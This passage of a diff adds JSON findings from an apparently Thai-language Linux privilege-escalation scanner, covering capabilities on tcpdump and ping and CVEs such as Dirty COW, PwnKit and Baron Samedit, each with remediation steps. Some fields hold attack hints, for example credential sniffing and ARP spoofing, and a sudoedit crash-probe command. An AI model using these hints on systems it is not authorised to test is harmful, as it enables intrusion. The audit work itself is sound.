+            "description_th": "\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15\u0e43\u0e2b\u0e49\u0e2a\u0e23\u0e49\u0e32\u0e07 raw socket \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e14\u0e31\u0e01\u0e1f\u0e31\u0e07 network traffic, \u0e1b\u0e25\u0e2d\u0e21\u0e41\u0e1b\u0e25\u0e07 packet, \u0e41\u0e25\u0e30\u0e08\u0e31\u0e14\u0e01\u0e32\u0e23 ICMP \u0e44\u0e14\u0e49\u0e42\u0e14\u0e22\u0e15\u0e23\u0e07",
+            "impact_th": "\u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e14\u0e31\u0e01\u0e08\u0e31\u0e1a credentials \u0e17\u0e35\u0e48\u0e2a\u0e48\u0e07\u0e1c\u0e48\u0e32\u0e19 network, \u0e17\u0e33 ARP poisoning \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e17\u0e33 MITM attack, \u0e2b\u0e23\u0e37\u0e2d inject packet \u0e17\u0e35\u0e48\u0e40\u0e1b\u0e47\u0e19\u0e2d\u0e31\u0e19\u0e15\u0e23\u0e32\u0e22",
+            "exploit_hint": "tcpdump credential capture, ARP/ICMP spoofing, packet injection",
+            "cves": [
+                "CVE-2020-14386"
+            ],
+            "remediation": "Limit cap_net_raw to specific tools (ping, tcpdump). Never assign broadly.",
+            "prevention_th": [
+                "\u0e08\u0e33\u0e01\u0e31\u0e14 cap_net_raw \u0e40\u0e09\u0e1e\u0e32\u0e30 tool \u0e17\u0e35\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e08\u0e23\u0e34\u0e07\u0e46 \u0e40\u0e0a\u0e48\u0e19 ping \u0e2b\u0e23\u0e37\u0e2d tcpdump \u0e17\u0e35\u0e48\u0e23\u0e30\u0e1a\u0e38 path \u0e0a\u0e31\u0e14\u0e40\u0e08\u0e19",
+                "\u0e43\u0e0a\u0e49 network encryption (TLS/HTTPS) \u0e17\u0e38\u0e01\u0e17\u0e35\u0e48\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e25\u0e14\u0e1c\u0e25\u0e01\u0e23\u0e30\u0e17\u0e1a\u0e08\u0e32\u0e01 sniffing",
+                "\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49 Dynamic ARP Inspection \u0e1a\u0e19 switch \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e1b\u0e49\u0e2d\u0e07\u0e01\u0e31\u0e19 ARP spoofing",
+                "Monitor network anomaly \u0e14\u0e49\u0e27\u0e22 IDS \u0e40\u0e0a\u0e48\u0e19 Suricata \u0e2b\u0e23\u0e37\u0e2d Snort"
+            ]
+        },
+        {
+            "binary": "/usr/bin/ping",
+            "binary_name": "ping",
+            "capability": "cap_net_raw",
+            "cap_type": "permitted",
+            "severity": "MEDIUM",
+            "risk_score": 6.0,
+            "owner": "root",
+            "world_writable": false,
+            "suid": false,
+            "file_type": "binary",
+            "is_interpreter": false,
+            "risk_factors": [],
+            "description": "Allows raw socket creation \u2014 enables network sniffing, spoofing, and ICMP manipulation.",
+            "description_th": "\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15\u0e43\u0e2b\u0e49\u0e2a\u0e23\u0e49\u0e32\u0e07 raw socket \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e14\u0e31\u0e01\u0e1f\u0e31\u0e07 network traffic, \u0e1b\u0e25\u0e2d\u0e21\u0e41\u0e1b\u0e25\u0e07 packet, \u0e41\u0e25\u0e30\u0e08\u0e31\u0e14\u0e01\u0e32\u0e23 ICMP \u0e44\u0e14\u0e49\u0e42\u0e14\u0e22\u0e15\u0e23\u0e07",
+            "impact_th": "\u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e14\u0e31\u0e01\u0e08\u0e31\u0e1a credentials \u0e17\u0e35\u0e48\u0e2a\u0e48\u0e07\u0e1c\u0e48\u0e32\u0e19 network, \u0e17\u0e33 ARP poisoning \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e17\u0e33 MITM attack, \u0e2b\u0e23\u0e37\u0e2d inject packet \u0e17\u0e35\u0e48\u0e40\u0e1b\u0e47\u0e19\u0e2d\u0e31\u0e19\u0e15\u0e23\u0e32\u0e22",
+            "exploit_hint": "tcpdump credential capture, ARP/ICMP spoofing, packet injection",
+            "cves": [
+                "CVE-2020-14386"
+            ],
+            "remediation": "Limit cap_net_raw to specific tools (ping, tcpdump). Never assign broadly.",
+            "prevention_th": [
+                "\u0e08\u0e33\u0e01\u0e31\u0e14 cap_net_raw \u0e40\u0e09\u0e1e\u0e32\u0e30 tool \u0e17\u0e35\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e08\u0e23\u0e34\u0e07\u0e46 \u0e40\u0e0a\u0e48\u0e19 ping \u0e2b\u0e23\u0e37\u0e2d tcpdump \u0e17\u0e35\u0e48\u0e23\u0e30\u0e1a\u0e38 path \u0e0a\u0e31\u0e14\u0e40\u0e08\u0e19",
+                "\u0e43\u0e0a\u0e49 network encryption (TLS/HTTPS) \u0e17\u0e38\u0e01\u0e17\u0e35\u0e48\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e25\u0e14\u0e1c\u0e25\u0e01\u0e23\u0e30\u0e17\u0e1a\u0e08\u0e32\u0e01 sniffing",
+                "\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49 Dynamic ARP Inspection \u0e1a\u0e19 switch \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e1b\u0e49\u0e2d\u0e07\u0e01\u0e31\u0e19 ARP spoofing",
+                "Monitor network anomaly \u0e14\u0e49\u0e27\u0e22 IDS \u0e40\u0e0a\u0e48\u0e19 Suricata \u0e2b\u0e23\u0e37\u0e2d Snort"
+            ]
+        },
+        {
+            "cve": "CVE-2017-9525",
+            "name": "Vixie Cron Group Crontab Privilege Escalation",
+            "category": "Permission",
+            "cvss": 6.5,
+            "severity": "MEDIUM",
+            "description": "Cron sets SGID on crontab binary, allowing members of the crontab group to escalate privileges.",
+            "description_th": "Vixie cron \u0e15\u0e31\u0e49\u0e07 SGID bit \u0e1a\u0e19 /usr/bin/crontab \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e2a\u0e21\u0e32\u0e0a\u0e34\u0e01\u0e02\u0e2d\u0e07 group 'crontab' \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e43\u0e0a\u0e49 crontab \u0e43\u0e19\u0e10\u0e32\u0e19\u0e30 group crontab \u0e41\u0e25\u0e30\u0e22\u0e01\u0e23\u0e30\u0e14\u0e31\u0e1a\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e44\u0e14\u0e49",
+            "impact_th": "\u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e17\u0e35\u0e48\u0e2d\u0e22\u0e39\u0e48\u0e43\u0e19 group 'crontab' \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e41\u0e01\u0e49\u0e44\u0e02 crontab \u0e02\u0e2d\u0e07 user \u0e2d\u0e37\u0e48\u0e19\u0e2b\u0e23\u0e37\u0e2d\u0e43\u0e0a\u0e49\u0e1b\u0e23\u0e30\u0e42\u0e22\u0e0a\u0e19\u0e4c\u0e08\u0e32\u0e01 SGID \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e02\u0e49\u0e32\u0e16\u0e36\u0e07\u0e44\u0e1f\u0e25\u0e4c\u0e17\u0e35\u0e48 group crontab \u0e40\u0e1b\u0e47\u0e19\u0e40\u0e08\u0e49\u0e32\u0e02\u0e2d\u0e07",
+            "remediation": "chmod g-s /usr/bin/crontab && upgrade vixie-cron",
+            "prevention_th": [
+                "\u0e16\u0e2d\u0e14 SGID bit: chmod g-s /usr/bin/crontab",
+                "\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e2a\u0e21\u0e32\u0e0a\u0e34\u0e01 group crontab: getent group crontab",
+                "\u0e25\u0e1a user \u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 crontab group: gpasswd -d username crontab",
+                "\u0e2d\u0e31\u0e1b\u0e40\u0e01\u0e23\u0e14 vixie-cron \u0e40\u0e1b\u0e47\u0e19\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19\u0e25\u0e48\u0e32\u0e2a\u0e38\u0e14"
+            ],
+            "check": "crontab_sgid"
+        },
+        {
+            "cve": "CVE-2016-5195",
+            "name": "Dirty COW",
+            "category": "Race Condition",
+            "severity": "HIGH",
+            "cvss": 7.8,
+            "description": "Race condition in mm/gup.c allows local privilege escalation via write access to read-only mappings.",
+            "status": "UNKNOWN",
+            "backport_detected": null,
+            "kpatch_detected": false,
+            "note": "",
+            "thai_detail": "\u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48 Dirty COW \u0e40\u0e01\u0e34\u0e14\u0e08\u0e32\u0e01 Race Condition \u0e43\u0e19 mm/gup.c \u0e02\u0e2d\u0e07 Linux Kernel\n     \u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e17\u0e35\u0e48\u0e21\u0e35\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c Local User \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e43\u0e0a\u0e49\u0e1b\u0e23\u0e30\u0e42\u0e22\u0e0a\u0e19\u0e4c\u0e08\u0e32\u0e01\u0e08\u0e31\u0e07\u0e2b\u0e27\u0e30\u0e41\u0e02\u0e48\u0e07\u0e02\u0e31\u0e19\n     \u0e23\u0e30\u0e2b\u0e27\u0e48\u0e32\u0e07 Thread \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e02\u0e35\u0e22\u0e19\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e25\u0e07\u0e43\u0e19 Memory Mapping \u0e41\u0e1a\u0e1a Read-Only \u0e44\u0e14\u0e49\n     \u0e40\u0e0a\u0e48\u0e19 \u0e41\u0e01\u0e49\u0e44\u0e02\u0e44\u0e1f\u0e25\u0e4c /etc/passwd \u0e2b\u0e23\u0e37\u0e2d SUID Binary \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e22\u0e01\u0e23\u0e30\u0e14\u0e31\u0e1a\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e40\u0e1b\u0e47\u0e19 root\n     \u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48\u0e19\u0e35\u0e49\u0e21\u0e35\u0e2d\u0e32\u0e22\u0e38\u0e01\u0e27\u0e48\u0e32 9 \u0e1b\u0e35\u0e01\u0e48\u0e2d\u0e19\u0e16\u0e39\u0e01\u0e04\u0e49\u0e19\u0e1e\u0e1a \u0e16\u0e37\u0e2d\u0e27\u0e48\u0e32\u0e40\u0e1b\u0e47\u0e19\u0e2b\u0e19\u0e36\u0e48\u0e07\u0e43\u0e19\u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48\u0e17\u0e35\u0e48\u0e2d\u0e31\u0e19\u0e15\u0e23\u0e32\u0e22\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14",
+            "thai_mitigation": "1. \u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15 Kernel \u0e40\u0e1b\u0e47\u0e19\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19 4.8.3 \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e42\u0e14\u0e22\u0e40\u0e23\u0e47\u0e27\u0e17\u0e35\u0e48\u0e2a\u0e38\u0e14\n     2. \u0e43\u0e0a\u0e49 systemd-nspawn \u0e2b\u0e23\u0e37\u0e2d SELinux/AppArmor \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e08\u0e33\u0e01\u0e31\u0e14\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e1c\u0e39\u0e49\u0e43\u0e0a\u0e49\n     3. \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a integrity \u0e02\u0e2d\u0e07\u0e44\u0e1f\u0e25\u0e4c SUID \u0e14\u0e49\u0e27\u0e22 AIDE \u0e2b\u0e23\u0e37\u0e2d Tripwire\n     4. \u0e43\u0e19\u0e01\u0e23\u0e13\u0e35\u0e09\u0e38\u0e01\u0e40\u0e09\u0e34\u0e19 \u0e43\u0e0a\u0e49 kpatch live-patch \u0e42\u0e14\u0e22\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07 reboot \u0e23\u0e30\u0e1a\u0e1a"
+        },
+        {
+            "cve": "CVE-2021-3156",
+            "name": "Baron Samedit",
+            "category": "Heap Overflow",
+            "severity": "HIGH",
+            "cvss": 7.8,
+            "description": "Heap-based buffer overflow in sudo sudoedit allows privilege escalation to root.",
+            "status": "UNKNOWN",
+            "backport_detected": null,
+            "kpatch_detected": false,
+            "note": "Affects sudo \u2264 1.9.5p1 \u2014 not kernel directly",
+            "thai_detail": "\u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48 Baron Samedit \u0e40\u0e01\u0e34\u0e14\u0e08\u0e32\u0e01 Heap Buffer Overflow \u0e43\u0e19 sudo\n     \u0e42\u0e14\u0e22\u0e40\u0e09\u0e1e\u0e32\u0e30\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07 sudoedit \u0e17\u0e35\u0e48\u0e08\u0e31\u0e14\u0e01\u0e32\u0e23 Argument \u0e2d\u0e22\u0e48\u0e32\u0e07\u0e44\u0e21\u0e48\u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22\n     \u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e17\u0e35\u0e48\u0e21\u0e35\u0e1a\u0e31\u0e0d\u0e0a\u0e35 Local User \u0e18\u0e23\u0e23\u0e21\u0e14\u0e32 (\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e2d\u0e22\u0e39\u0e48\u0e43\u0e19 sudoers)\n     \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e22\u0e01\u0e23\u0e30\u0e14\u0e31\u0e1a\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e40\u0e1b\u0e47\u0e19 root \u0e44\u0e14\u0e49\u0e17\u0e31\u0e19\u0e17\u0e35 \u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e23\u0e39\u0e49\u0e23\u0e2b\u0e31\u0e2a\u0e1c\u0e48\u0e32\u0e19\n     \u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48\u0e19\u0e35\u0e49\u0e21\u0e35\u0e21\u0e32\u0e19\u0e32\u0e19\u0e01\u0e27\u0e48\u0e32 10 \u0e1b\u0e35 \u0e04\u0e49\u0e19\u0e1e\u0e1a\u0e42\u0e14\u0e22 Qualys Research Team",
+            "thai_mitigation": "1. \u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15 sudo \u0e40\u0e1b\u0e47\u0e19\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19 1.9.5p2 \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b (sudo --version)\n     2. \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a: sudoedit -s '\\' $(python3 -c 'print(\"A\"*65536)')\n        \u0e16\u0e49\u0e32\u0e02\u0e36\u0e49\u0e19 error = \u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22, \u0e16\u0e49\u0e32 crash = \u0e22\u0e31\u0e07\u0e21\u0e35\u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48\n     3. \u0e08\u0e33\u0e01\u0e31\u0e14\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c sudo \u0e43\u0e2b\u0e49\u0e40\u0e09\u0e1e\u0e32\u0e30\u0e1c\u0e39\u0e49\u0e43\u0e0a\u0e49\u0e17\u0e35\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e43\u0e19 /etc/sudoers\n     4. \u0e43\u0e0a\u0e49 PAM Module \u0e40\u0e1e\u0e34\u0e48\u0e21\u0e40\u0e15\u0e34\u0e21\u0e40\u0e1e\u0e37\u0e48\u0e2d Log \u0e01\u0e32\u0e23\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19 sudo \u0e17\u0e38\u0e01\u0e04\u0e23\u0e31\u0e49\u0e07"
+        },
+        {
+            "cve": "CVE-2021-22555",
+            "name": "Netfilter Heap Out-of-Bounds Write",
+            "category": "Heap Overflow",
+            "severity": "HIGH",
+            "cvss": 7.8,
+            "description": "Heap OOB write in xt_compat_target_from_user() in net/netfilter/x_tables.c.",
+            "status": "UNKNOWN",
+            "backport_detected": null,
+            "kpatch_detected": false,
+            "note": "",
+            "thai_detail": "\u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48\u0e2d\u0e22\u0e39\u0e48\u0e43\u0e19\u0e1f\u0e31\u0e07\u0e01\u0e4c\u0e0a\u0e31\u0e19 xt_compat_target_from_user() \u0e43\u0e19 x_tables.c\n     \u0e40\u0e01\u0e34\u0e14\u0e08\u0e32\u0e01\u0e01\u0e32\u0e23\u0e04\u0e33\u0e19\u0e27\u0e13\u0e02\u0e19\u0e32\u0e14 Buffer \u0e1c\u0e34\u0e14\u0e1e\u0e25\u0e32\u0e14\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e41\u0e1b\u0e25\u0e07 iptables Rules\n     \u0e08\u0e32\u0e01 32-bit \u0e44\u0e1b 64-bit \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e40\u0e01\u0e34\u0e14 Heap OOB Write\n     \u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e17\u0e35\u0e48\u0e21\u0e35\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c CAP_NET_ADMIN \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e43\u0e0a\u0e49\u0e40\u0e1e\u0e37\u0e48\u0e2d\n     \u0e23\u0e31\u0e19\u0e42\u0e04\u0e49\u0e14\u0e2d\u0e31\u0e19\u0e15\u0e23\u0e32\u0e22\u0e43\u0e19 Kernel Space \u0e2b\u0e23\u0e37\u0e2d\u0e22\u0e01\u0e23\u0e30\u0e14\u0e31\u0e1a\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e40\u0e1b\u0e47\u0e19 root",
+            "thai_mitigation": "1. \u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15 Kernel \u0e40\u0e1b\u0e47\u0e19 5.12.14 \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\n     2. \u0e43\u0e0a\u0e49 nftables \u0e41\u0e17\u0e19 iptables (\u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22\u0e01\u0e27\u0e48\u0e32\u0e41\u0e25\u0e30\u0e44\u0e14\u0e49\u0e23\u0e31\u0e1a\u0e01\u0e32\u0e23 Maintain \u0e21\u0e32\u0e01\u0e01\u0e27\u0e48\u0e32)\n     3. \u0e08\u0e33\u0e01\u0e31\u0e14 CAP_NET_ADMIN \u0e14\u0e49\u0e27\u0e22 systemd Service Hardening:\n        CapabilityBoundingSet=~CAP_NET_ADMIN\n     4. \u0e40\u0e1b\u0e34\u0e14 CONFIG_HARDENED_USERCOPY \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e15\u0e23\u0e27\u0e08\u0e08\u0e31\u0e1a OOB \u0e2d\u0e31\u0e15\u0e42\u0e19\u0e21\u0e31\u0e15\u0e34"
+        },
+        {
+            "cve": "CVE-2021-4034",
+            "name": "PwnKit (pkexec)",
+            "category": "SUID",
+            "severity": "HIGH",
+            "cvss": 7.8,
+            "description": "Memory corruption in pkexec (polkit) allows unprivileged local privilege escalation.",
+            "status": "UNKNOWN",
+            "backport_detected": null,
+            "kpatch_detected": false,
+            "note": "Affects polkit < 0.120 \u2014 not kernel directly",
+            "thai_detail": "\u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48 PwnKit \u0e2d\u0e22\u0e39\u0e48\u0e43\u0e19 pkexec \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19\u0e2a\u0e48\u0e27\u0e19\u0e2b\u0e19\u0e36\u0e48\u0e07\u0e02\u0e2d\u0e07 polkit\n     \u0e40\u0e01\u0e34\u0e14\u0e08\u0e32\u0e01 Memory Corruption \u0e43\u0e19\u0e01\u0e32\u0e23\u0e1b\u0e23\u0e30\u0e21\u0e27\u0e25\u0e1c\u0e25 Argument \u0e02\u0e2d\u0e07 pkexec\n     \u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48\u0e21\u0e35\u0e21\u0e32\u0e19\u0e32\u0e19\u0e01\u0e27\u0e48\u0e32 12 \u0e1b\u0e35 (\u0e15\u0e31\u0e49\u0e07\u0e41\u0e15\u0e48 polkit \u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19\u0e41\u0e23\u0e01)\n     \u0e1c\u0e39\u0e49\u0e43\u0e0a\u0e49 Local \u0e17\u0e38\u0e01\u0e04\u0e19\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e22\u0e01\u0e23\u0e30\u0e14\u0e31\u0e1a\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e40\u0e1b\u0e47\u0e19 root \u0e44\u0e14\u0e49\u0e17\u0e31\u0e19\u0e17\u0e35\n     \u0e44\u0e21\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e49\u0e2d\u0e07\u0e21\u0e35 pkexec \u0e43\u0e19\u0e23\u0e30\u0e1a\u0e1a\u0e01\u0e47\u0e44\u0e14\u0e49\u0e23\u0e31\u0e1a\u0e1c\u0e25\u0e01\u0e23\u0e30\u0e17\u0e1a\u0e16\u0e49\u0e32 polkit \u0e15\u0e34\u0e14\u0e15\u0e31\u0e49\u0e07\u0e2d\u0e22\u0e39\u0e48",
+            "thai_mitigation": "1. \u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15 polkit \u0e40\u0e1b\u0e47\u0e19\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19 0.120 \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\u0e17\u0e31\u0e19\u0e17\u0e35\n     2. \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19: pkexec --version\n     3. \u0e41\u0e01\u0e49\u0e44\u0e02\u0e0a\u0e31\u0e48\u0e27\u0e04\u0e23\u0e32\u0e27: chmod 0755 /usr/bin/pkexec (\u0e25\u0e1a SUID bit)\n        \u0e2b\u0e21\u0e32\u0e22\u0e40\u0e2b\u0e15\u0e38: \u0e2d\u0e32\u0e08\u0e17\u0e33\u0e43\u0e2b\u0e49\u0e1a\u0e32\u0e07\u0e41\u0e2d\u0e1b\u0e17\u0e35\u0e48\u0e43\u0e0a\u0e49 pkexec \u0e44\u0e21\u0e48\u0e17\u0e33\u0e07\u0e32\u0e19\n     4. \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a Audit Log \u0e2b\u0e32\u0e01\u0e32\u0e23 Exploit:\n        ausearch -m avc -ts recent | grep pkexec"
+        },
+        {
+            "cve": "CVE-2022-0492",
+            "name": "cgroup v1 Container Escape",
+            "category": "Container",
+            "severity": "HIGH",
+            "cvss": 7.0,
+            "description": "Flaw in cgroup v1 release_agent allows container escape to host.",
+            "status": "UNKNOWN",
+            "backport_detected": null,
+            "kpatch_detected": false,
+            "note": "",
+            "thai_detail": "\u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48\u0e2d\u0e22\u0e39\u0e48\u0e43\u0e19 cgroup v1 release_agent \u0e02\u0e2d\u0e07 Linux Kernel\n     release_agent \u0e04\u0e37\u0e2d Script \u0e17\u0e35\u0e48\u0e23\u0e31\u0e19\u0e40\u0e21\u0e37\u0e48\u0e2d Process \u0e01\u0e25\u0e38\u0e48\u0e21\u0e2b\u0e19\u0e36\u0e48\u0e07\u0e2a\u0e34\u0e49\u0e19\u0e2a\u0e38\u0e14\n     \u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e43\u0e19 Container \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e41\u0e01\u0e49\u0e44\u0e02 release_agent\n     \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e23\u0e31\u0e19\u0e04\u0e33\u0e2a\u0e31\u0e48\u0e07\u0e1a\u0e19 Host \u0e42\u0e14\u0e22\u0e15\u0e23\u0e07 \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e2b\u0e25\u0e38\u0e14\u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 Container \u0e44\u0e14\u0e49\n     \u0e2d\u0e31\u0e19\u0e15\u0e23\u0e32\u0e22\u0e21\u0e32\u0e01\u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a\u0e23\u0e30\u0e1a\u0e1a Docker, Kubernetes, \u0e41\u0e25\u0e30 LXC",
+            "thai_mitigation": "1. \u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15 Kernel \u0e40\u0e1b\u0e47\u0e19 5.17.1 \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b\n     2. \u0e43\u0e0a\u0e49 cgroup v2 \u0e41\u0e17\u0e19 cgroup v1 (\u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22\u0e01\u0e27\u0e48\u0e32):\n        \u0e40\u0e1e\u0e34\u0e48\u0e21 'systemd.unified_cgroup_hierarchy=1' \u0e43\u0e19 Kernel Parameter\n     3. \u0e23\u0e31\u0e19 Container \u0e14\u0e49\u0e27\u0e22 --privileged=false (\u0e04\u0e48\u0e32 Default)\n     4. \u0e43\u0e0a\u0e49 Seccomp Profile \u0e41\u0e25\u0e30 AppArmor/SELinux \u0e1a\u0e19 Container\n     5. \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a release_agent: cat /sys/fs/cgroup/release_agent"
+        },
+        {
+            "cve": "CVE-2017-5753",
+            "name": "Spectre v1",
+            "category": "CPU Speculative",
+            "severity": "MEDIUM",
+            "cvss": 5.6,
+            "description": "Bounds check bypass via speculative execution allows information disclosure.",
+            "status": "UNKNOWN",
+            "backport_detected": null,
+            "kpatch_detected": false,
+            "note": "",
+            "thai_detail": "\u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48 Spectre v1 \u0e40\u0e1b\u0e47\u0e19\u0e1b\u0e31\u0e0d\u0e2b\u0e32\u0e23\u0e30\u0e14\u0e31\u0e1a Hardware \u0e43\u0e19 CPU \u0e2a\u0e21\u0e31\u0e22\u0e43\u0e2b\u0e21\u0e48\n     CPU \u0e17\u0e33\u0e01\u0e32\u0e23 Speculative Execution (\u0e04\u0e32\u0e14\u0e40\u0e14\u0e32\u0e41\u0e25\u0e30\u0e23\u0e31\u0e19\u0e42\u0e04\u0e49\u0e14\u0e25\u0e48\u0e27\u0e07\u0e2b\u0e19\u0e49\u0e32)\n     \u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2b\u0e25\u0e2d\u0e01 CPU \u0e43\u0e2b\u0e49\u0e2d\u0e48\u0e32\u0e19\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e08\u0e32\u0e01 Memory \u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e21\u0e35\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\n     \u0e41\u0e25\u0e49\u0e27\u0e43\u0e0a\u0e49 Cache Timing Attack \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e14\u0e36\u0e07\u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e19\u0e31\u0e49\u0e19 \u0e40\u0e0a\u0e48\u0e19 Password, Key\n     \u0e2a\u0e48\u0e07\u0e1c\u0e25\u0e15\u0e48\u0e2d CPU \u0e02\u0e2d\u0e07 Intel, AMD, ARM \u0e40\u0e01\u0e37\u0e2d\u0e1a\u0e17\u0e38\u0e01\u0e23\u0e38\u0e48\u0e19\u0e17\u0e35\u0e48\u0e1c\u0e25\u0e34\u0e15\u0e2b\u0e25\u0e31\u0e07\u0e1b\u0e35 1995",
